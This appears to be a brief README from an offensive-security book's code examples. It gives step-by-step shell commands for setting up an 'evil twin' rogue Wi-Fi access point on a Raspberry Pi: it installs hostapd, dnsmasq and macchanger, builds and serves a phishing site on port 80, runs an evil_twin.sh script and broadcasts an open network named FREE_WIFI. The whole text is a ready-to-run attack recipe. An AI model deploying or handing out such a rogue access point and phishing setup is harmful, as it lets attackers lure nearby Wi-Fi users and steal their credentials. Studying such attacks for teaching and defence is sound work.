# Evil Twin

On a Raspberry Pi with Rust installed:

```shell
$ sudo apt install -y macchanger hostapd dnsmasq sqlite3 libssl-dev
$ git clone https://github.com/skerkour/black-hat-rust.git && cd black-hat-rust/ch_09/evil_twin
$ make -C ../phishing/ build && cp -r ../phishing/dist/* .
$ sudo ./server -p 80 &
$ sudo ./evil_twin.sh
```


Then visit the `FREE_WIFI` wifi network.

You can update the SSID (access point's name) in `hostapd.conf`.
